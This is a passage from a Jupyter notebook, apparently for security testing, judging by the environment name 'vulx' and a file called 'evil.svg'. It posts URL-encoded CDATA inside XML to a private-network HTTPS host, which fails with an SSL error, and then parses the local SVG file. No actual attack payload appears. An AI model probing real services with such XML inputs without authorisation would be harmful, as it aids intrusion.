      "Cell \u001b[0;32mIn[192], line 28\u001b[0m\n\u001b[1;32m     19\u001b[0m body \u001b[38;5;241m=\u001b[39m \u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\"\"\u001b[39m\n\u001b[1;32m     20\u001b[0m \u001b[38;5;124m<root>\u001b[39m\n\u001b[1;32m     21\u001b[0m \u001b[38;5;124m  <message>\u001b[39m\n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m     24\u001b[0m \u001b[38;5;124m</root>\u001b[39m\n\u001b[1;32m     25\u001b[0m \u001b[38;5;124m\"\"\"\u001b[39m\n\u001b[1;32m     27\u001b[0m \u001b[38;5;66;03m# Send the request to the URL endpoint\u001b[39;00m\n\u001b[0;32m---> 28\u001b[0m response \u001b[38;5;241m=\u001b[39m \u001b[43mrequests\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mpost\u001b[49m\u001b[43m(\u001b[49m\u001b[43murl\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mheaders\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mheaders\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mdata\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mbody\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m     30\u001b[0m \u001b[38;5;66;03m# Handle the response\u001b[39;00m\n\u001b[1;32m     31\u001b[0m \u001b[38;5;66;03m# ...\u001b[39;00m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/requests/api.py:115\u001b[0m, in \u001b[0;36mpost\u001b[0;34m(url, data, json, **kwargs)\u001b[0m\n\u001b[1;32m    103\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mpost\u001b[39m(url, data\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mNone\u001b[39;00m, json\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mNone\u001b[39;00m, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs):\n\u001b[1;32m    104\u001b[0m \u001b[38;5;250m    \u001b[39m\u001b[38;5;124mr\u001b[39m\u001b[38;5;124;03m\"\"\"Sends a POST request.\u001b[39;00m\n\u001b[1;32m    105\u001b[0m \n\u001b[1;32m    106\u001b[0m \u001b[38;5;124;03m    :param url: URL for the new :class:`Request` object.\u001b[39;00m\n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m    112\u001b[0m \u001b[38;5;124;03m    :rtype: requests.Response\u001b[39;00m\n\u001b[1;32m    113\u001b[0m \u001b[38;5;124;03m    \"\"\"\u001b[39;00m\n\u001b[0;32m--> 115\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mrequest\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43mpost\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43murl\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mdata\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mdata\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mjson\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mjson\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/requests/api.py:59\u001b[0m, in \u001b[0;36mrequest\u001b[0;34m(method, url, **kwargs)\u001b[0m\n\u001b[1;32m     55\u001b[0m \u001b[38;5;66;03m# By using the 'with' statement we are sure the session is closed, thus we\u001b[39;00m\n\u001b[1;32m     56\u001b[0m \u001b[38;5;66;03m# avoid leaving sockets open which can trigger a ResourceWarning in some\u001b[39;00m\n\u001b[1;32m     57\u001b[0m \u001b[38;5;66;03m# cases, and look like a memory leak in others.\u001b[39;00m\n\u001b[1;32m     58\u001b[0m \u001b[38;5;28;01mwith\u001b[39;00m sessions\u001b[38;5;241m.\u001b[39mSession() \u001b[38;5;28;01mas\u001b[39;00m session:\n\u001b[0;32m---> 59\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43msession\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mrequest\u001b[49m\u001b[43m(\u001b[49m\u001b[43mmethod\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mmethod\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43murl\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43murl\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/requests/sessions.py:587\u001b[0m, in \u001b[0;36mSession.request\u001b[0;34m(self, method, url, params, data, headers, cookies, files, auth, timeout, allow_redirects, proxies, hooks, stream, verify, cert, json)\u001b[0m\n\u001b[1;32m    582\u001b[0m send_kwargs \u001b[38;5;241m=\u001b[39m {\n\u001b[1;32m    583\u001b[0m     \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mtimeout\u001b[39m\u001b[38;5;124m\"\u001b[39m: timeout,\n\u001b[1;32m    584\u001b[0m     \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mallow_redirects\u001b[39m\u001b[38;5;124m\"\u001b[39m: allow_redirects,\n\u001b[1;32m    585\u001b[0m }\n\u001b[1;32m    586\u001b[0m send_kwargs\u001b[38;5;241m.\u001b[39mupdate(settings)\n\u001b[0;32m--> 587\u001b[0m resp \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msend\u001b[49m\u001b[43m(\u001b[49m\u001b[43mprep\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[43msend_kwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    589\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m resp\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/requests/sessions.py:701\u001b[0m, in \u001b[0;36mSession.send\u001b[0;34m(self, request, **kwargs)\u001b[0m\n\u001b[1;32m    698\u001b[0m start \u001b[38;5;241m=\u001b[39m preferred_clock()\n\u001b[1;32m    700\u001b[0m \u001b[38;5;66;03m# Send the request\u001b[39;00m\n\u001b[0;32m--> 701\u001b[0m r \u001b[38;5;241m=\u001b[39m \u001b[43madapter\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msend\u001b[49m\u001b[43m(\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    703\u001b[0m \u001b[38;5;66;03m# Total elapsed time of the request (approximately)\u001b[39;00m\n\u001b[1;32m    704\u001b[0m elapsed \u001b[38;5;241m=\u001b[39m preferred_clock() \u001b[38;5;241m-\u001b[39m start\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/requests/adapters.py:517\u001b[0m, in \u001b[0;36mHTTPAdapter.send\u001b[0;34m(self, request, stream, timeout, verify, cert, proxies)\u001b[0m\n\u001b[1;32m    513\u001b[0m         \u001b[38;5;28;01mraise\u001b[39;00m ProxyError(e, request\u001b[38;5;241m=\u001b[39mrequest)\n\u001b[1;32m    515\u001b[0m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(e\u001b[38;5;241m.\u001b[39mreason, _SSLError):\n\u001b[1;32m    516\u001b[0m         \u001b[38;5;66;03m# This branch is for urllib3 v1.22 and later.\u001b[39;00m\n\u001b[0;32m--> 517\u001b[0m         \u001b[38;5;28;01mraise\u001b[39;00m SSLError(e, request\u001b[38;5;241m=\u001b[39mrequest)\n\u001b[1;32m    519\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mConnectionError\u001b[39;00m(e, request\u001b[38;5;241m=\u001b[39mrequest)\n\u001b[1;32m    521\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m ClosedPoolError \u001b[38;5;28;01mas\u001b[39;00m e:\n",
      "\u001b[0;31mSSLError\u001b[0m: HTTPSConnectionPool(host='192.168.30.102', port=9091): Max retries exceeded with url: / (Caused by SSLError(SSLEOFError(8, 'EOF occurred in violation of protocol (_ssl.c:1129)')))"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import urllib.parse\n",
    "\n",
    "# CDATA to be sent as payload\n",
    "cdata = \"<![CDATA[This is some <b>bold</b> text.]]>\"\n",
    "\n",
    "# Encode the CDATA\n",
    "encoded_cdata = urllib.parse.quote(cdata, safe='')\n",
    "\n",
    "# URL endpoint to send the encoded CDATA to\n",
    "url = \"https://192.168.30.102:9091/\"\n",
    "\n",
    "# Request headers\n",
    "headers = {\n",
    "    \"Content-Type\": \"application/xml\"\n",
    "}\n",
    "\n",
    "# Request body containing the encoded CDATA\n",
    "body = f\"\"\"\n",
    "<root>\n",
    "  <message>\n",
    "    {encoded_cdata}\n",
    "  </message>\n",
    "</root>\n",
    "\"\"\"\n",
    "\n",
    "# Send the request to the URL endpoint\n",
    "response = requests.post(url, headers=headers, data=body)\n",
    "\n",
    "# Handle the response\n",
    "# ...\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 213,
   "id": "805517e4-ac63-417e-bbfe-3278ef592189",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "from bs4 import BeautifulSoup\n",
    "with open(\"evil.svg\") as file:\n",
    "    soup = BeautifulSoup(file, features=\"lxml-xml\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 214,
   "id": "805f0a70-65d1-4c48-8368-44c084b7c86f",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[<foo/>]"
      ]
     },
     "execution_count": 214,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "soup.find_all()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61ab9c3d-436e-4c80-89f6-e059e75727f2",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
